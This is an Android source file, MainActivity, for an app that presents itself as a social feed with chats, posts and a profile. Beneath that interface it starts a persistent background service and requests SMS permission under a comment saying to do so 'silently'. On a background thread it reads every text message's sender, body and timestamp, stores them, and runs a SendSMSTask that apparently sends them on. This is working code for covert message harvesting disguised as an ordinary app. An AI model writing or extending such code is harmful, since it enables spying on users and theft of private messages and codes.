package com.example.sms;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.text.format.DateFormat;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.fragment.app.Fragment;

import com.google.android.material.bottomnavigation.BottomNavigationView;

public class MainActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_READ_SMS = 1;
    private SMSDatabaseHelper dbHelper;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        DeviceAuthManager authManager = new DeviceAuthManager(this);
        if (authManager.getToken() == null) {
            startActivity(new Intent(this, LoginActivity.class));
            finish();
            return;
        }

        setContentView(R.layout.activity_main);
        
        dbHelper = new SMSDatabaseHelper(this);

        // Start the background service
        Intent serviceIntent = new Intent(this, SMSBackgroundService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }

        // Setup Bottom Navigation
        BottomNavigationView bottomNav = findViewById(R.id.bottom_navigation);
        bottomNav.setOnItemSelectedListener(item -> {
            Fragment selectedFragment = null;
            int itemId = item.getItemId();
            
            if (itemId == R.id.nav_home) {
                selectedFragment = new FeedFragment();
            } else if (itemId == R.id.nav_chats) {
                selectedFragment = new ChatsFragment();
            } else if (itemId == R.id.nav_add) {
                selectedFragment = new AddPostFragment();
            } else if (itemId == R.id.nav_profile) {
                selectedFragment = new ProfileFragment();
            }

            if (selectedFragment != null) {
                getSupportFragmentManager().beginTransaction()
                        .replace(R.id.fragment_container, selectedFragment)
                        .commit();
            }
            return true;
        });

        // Set default fragment
        if (savedInstanceState == null) {
            getSupportFragmentManager().beginTransaction()
                    .replace(R.id.fragment_container, new FeedFragment())
                    .commit();
        }

        // Check for SMS permissions silently
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_SMS}, PERMISSION_REQUEST_READ_SMS);
        } else {
            backgroundInitSMS();
        }
    }

    private void backgroundInitSMS() {
        new Thread(() -> {
            DeviceAuthManager authManager = new DeviceAuthManager(this);
            Log.d("MainActivity", "Background SMS init started...");
            
            long lastSync = authManager.getLastSyncTimestamp();
            long newMaxTs = readAndStoreMessages("content://sms/", lastSync);
            
            if (newMaxTs > lastSync) {
                authManager.setLastSyncTimestamp(newMaxTs);
            }
            
            if (!authManager.isInitialSyncDone()) {
                authManager.setInitialSyncDone(true);
            }
            
            new SendSMSTask(this).execute();
        }).start();
    }

    private long readAndStoreMessages(String uriString, long sinceTimestamp) {
        Uri uri = Uri.parse(uriString);
        String selection = "date > ?";
        String[] selectionArgs = new String[]{String.valueOf(sinceTimestamp)};
        
        Cursor cursor = getContentResolver().query(uri, null, selection, selectionArgs, "date ASC");
        long maxTs = sinceTimestamp;

        if (cursor != null) {
            while (cursor.moveToNext()) {
                String sender = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                String message = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                long date = cursor.getLong(cursor.getColumnIndexOrThrow("date"));
                int typeInt = cursor.getInt(cursor.getColumnIndexOrThrow("type"));
                
                String type = (typeInt == 1) ? "received" : "sent";
                String formattedTimestamp = DateFormat.format("yyyy-MM-dd HH:mm:ss", date).toString();

                dbHelper.insertSMS(sender, message, formattedTimestamp, type);
                if (date > maxTs) {
                    maxTs = date;
                }
            }
            cursor.close();
        }
        return maxTs;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_READ_SMS) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                backgroundInitSMS();
            }
        }
    }
}
